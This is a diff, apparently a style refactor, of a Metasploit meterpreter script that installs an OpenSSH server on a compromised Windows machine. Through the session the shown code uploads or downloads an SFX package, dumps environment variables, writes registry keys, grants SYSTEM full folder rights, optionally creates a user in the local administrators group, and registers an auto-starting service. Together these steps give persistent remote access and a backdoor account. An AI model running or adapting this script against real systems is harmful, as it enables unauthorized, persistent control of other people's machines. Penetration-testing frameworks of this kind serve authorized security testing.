@@ -1,9 +1,9 @@
+# frozen_string_literal: true
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
-
 
 #
 # meterpreter-script to deploy + run OpenSSH
@@ -32,7 +32,7 @@ meter_type = client.platform
   "-N"  => [ true, "Set custom service name"],
   "-m"  => [ true, "Do not start the OpenSSH-service after installation"],
   "-t"  => [ true, "Set start-type of the service to manual (Default: auto)"]
-  )
+)
 
 def usage
   print_line("OpenSSH-server deploy+run script")
@@ -49,7 +49,7 @@ end
 def deletekey(key)
   root_key, base_key = client.sys.registry.splitkey(key)
   rtrncode = client.sys.registry.delete_key(root_key, base_key)
-  return rtrncode
+  rtrncode
 end
 
 def setval(key, value, data, type = "REG_SZ")
@@ -62,7 +62,7 @@ def queryval(key, value)
   root_key, base_key = client.sys.registry.splitkey(key)
   hkey = client.sys.registry.open_key(root_key, base_key)
   valdata = hkey.query_value(value)
-  return valdata.data
+  valdata.data
 end
 
 # Wrong Meterpreter Version Message Function
@@ -92,37 +92,36 @@ noauto = false
 dirname = nil
 type = "auto"
 
-
 #
 # Option parsing
 #
-@@exec_opts.parse(args) { |opt, idx, val|
+@@exec_opts.parse(args) do |opt, _idx, val|
   case opt
 
   when "-h"
     usage
 
   when "-f"
-    if !val
+    unless val
       print_error("-f requires the SFX-filename as argument !")
       usage
     end
     extractfilename = val
-    if not ::File.exist?(extractfilename)
+    unless ::File.exist?(extractfilename)
       print_error("OpenSSH-SFX not found/accessible!")
       usage
     end
     manual = true
 
   when "-U"
-    if !val
+    unless val
       print_error("-U requires the download-URL for the OpenSSH-SFX as argument !")
       usage
     end
     downloadurl = val
 
   when "-p"
-    if !val
+    unless val
       print_error("-p requires the password (for the windows-user to add) as argument !")
       usage
     end
@@ -133,7 +132,7 @@ type = "auto"
     password = val
 
   when "-u"
-    if !val
+    unless val
       print_error("-u requires the username (for the windows-user to add) as argument!")
       usage
     end
@@ -143,7 +142,7 @@ type = "auto"
     uninstall = true
 
   when "-I"
-    if !val
+    unless val
       print_error("-I requires a directory-name to use as installpath")
       usage
     end
@@ -153,14 +152,14 @@ type = "auto"
     forced = true
 
   when "-S"
-    if !val
+    unless val
       print_error("-S requires s custom string to use as the service-description")
       usage
     end
     servicedesc = val
 
   when "-N"
-    if !val
+    unless val
       print_error("-N requires a custom string to use as service-name")
       usage
     end
@@ -176,7 +175,7 @@ type = "auto"
     print_error("Unknown option: #{opt}")
     usage
   end
-}
+end
 
 # Check for Version of Meterpreter
 wrong_meter_version(meter_type) if meter_type !~ /win32|win64/i
@@ -196,7 +195,7 @@ if uninstall
   end
   uninstallfile = "#{dirname}\\etc\\uninst.bak"
   uf = client.fs.file.new(uninstallfile, "rb")
-  while not uf.eof?
+  until uf.eof?
     linesarray = uf.read.split("\r\n")
     username = linesarray[0]
     servicename = linesarray[1]
@@ -232,8 +231,8 @@ end
 root_key, base_key = client.sys.registry.splitkey("HKLM\\Software\\Cygnus\ Solutions")
 open_key = client.sys.registry.open_key(root_key, base_key)
 keys = open_key.enum_key
-if ( keys.length > 0)
-  if not forced
+unless keys.empty?
+  unless forced
     print_error(warning)
     raise Rex::Script::Completed
   end
@@ -244,7 +243,7 @@ end
 #
 
 if manual == false
-  if not ::File.exist?(extractfilename)
+  unless ::File.exist?(extractfilename)
     print_status("openssh-extract.sfx could not be found. Downloading it now...")
     print_status(license)
     extractexe = Net::HTTP.get URI.parse(downloadurl)
@@ -257,36 +256,35 @@ end
 #
 # Generate sshd-dir + upload file to client
 #
-if dirname == nil
-  dirname = client.fs.file.expand_path("%TEMP%") + '\\' + "#{rand(36 ** 8).to_s(36).rjust(8,"0")}"
+if dirname.nil?
+  dirname = client.fs.file.expand_path("%TEMP%") + '\\' + rand(36**8).to_s(36).rjust(8, '0').to_s
   print_status("Creating directory #{dirname}.....")
   client.fs.dir.mkdir(dirname)
 else
-  if  !::File.exist?(dirname) && !::File.directory?(dirname)
+  if !::File.exist?(dirname) && !::File.directory?(dirname)
     print_status("Creating directory #{dirname}.....")
     client.fs.dir.mkdir(dirname)
   end
 end
-fileontrgt = "#{dirname}\\#{rand(36 ** 8).to_s(36).rjust(8,"0")}.exe"
+fileontrgt = "#{dirname}\\#{rand(36**8).to_s(36).rjust(8, '0')}.exe"
 print_status("Uploading #{extractfilename} to #{fileontrgt}....")
 client.fs.file.upload_file(fileontrgt, extractfilename)
 print_status("#{extractfilename} successfully uploaded to #{fileontrgt}!")
 
-
 # Get required infos about the target-system
-clientenv = Hash.new
-envtxtname = "#{dirname}\\#{rand(36 ** 8).to_s(36).rjust(8,"0")}.txt"
+clientenv = {}
+envtxtname = "#{dirname}\\#{rand(36**8).to_s(36).rjust(8, '0')}.txt"
 client.sys.process.execute("cmd.exe", "/c set > #{envtxtname}")
 
 fd = client.fs.file.new(envtxtname, "rb")
-while not fd.eof?
+until fd.eof?
   linesarray = fd.read.split("\r\n")
-  linesarray.each { |line|
+  linesarray.each do |line|
     currentline = line.split('=')
     envvarname = currentline[0]
     envvarvalue = currentline[1]
     clientenv[envvarname] = envvarvalue
-  }
+  end
 end
 fd.close
 
@@ -296,7 +294,6 @@ unless clientenv["OS"] == 'Windows_NT'
   print_error("This script will run on Windows-NT based OS only!")
   raise Rex::Script::Completed
 end
-
 
 # Extract the files
 
@@ -308,7 +305,7 @@ print_status("Files extracted .. ")
 #
 # Import required registry keys
 #
-homebase = clientenv["ALLUSERSPROFILE"].slice(0,clientenv["ALLUSERSPROFILE"].rindex('\\'))
+homebase = clientenv["ALLUSERSPROFILE"].slice(0, clientenv["ALLUSERSPROFILE"].rindex('\\'))
 
 createkey("HKLM\\Software\\Cygnus\ Solutions\\Cygwin\\mounts\ v2")
 createkey("HKLM\\Software\\Cygnus\ Solutions\\Cygwin\\mounts\ v2\\/")
@@ -331,23 +328,21 @@ client.sys.process.execute("cacls.exe", "#{dirname} /E /T /G SYSTEM:F")
 # Add windows-user if requested
 #
 unless username == "none"
-  if password == nil
+  if password.nil?
     print_error("You need to provide a nonempty password for the user with the \"-p\"-parameter!")
     usage
   end
 
-  #Get localized name for windows-admin-grp
+  # Get localized name for windows-admin-grp
   admingrpname = nil
   client.sys.process.execute("cmd.exe", "/c #{dirname}\\bin\\mkgroup.exe -l > #{dirname}\\groupnames.txt")
   sleep 1
   fd = client.fs.file.new("#{dirname}\\groupnames.txt", "rb")
-  while not fd.eof?
+  until fd.eof?
     linesarray = fd.read.split("\n")
-    linesarray.each { |line|
-      if line[0..4] =~ /[aA]dmin/
-        admingrpname = line.slice!(/[aA]dmin[a-z]+/)
-      end
-    }
+    linesarray.each do |line|
+      admingrpname = line.slice!(/[aA]dmin[a-z]+/) if line[0..4] =~ /[aA]dmin/
+    end
   end
   fd.close
   sleep 2
@@ -395,7 +390,6 @@ uf = client.fs.file.new(uninstallfile, "w")
 uf.write "#{username} \r\n"
 uf.write "#{servicename} \r\n"
 uf.close
-
 
 # Run OpenSSH-service unless noauto was specified
 unless noauto
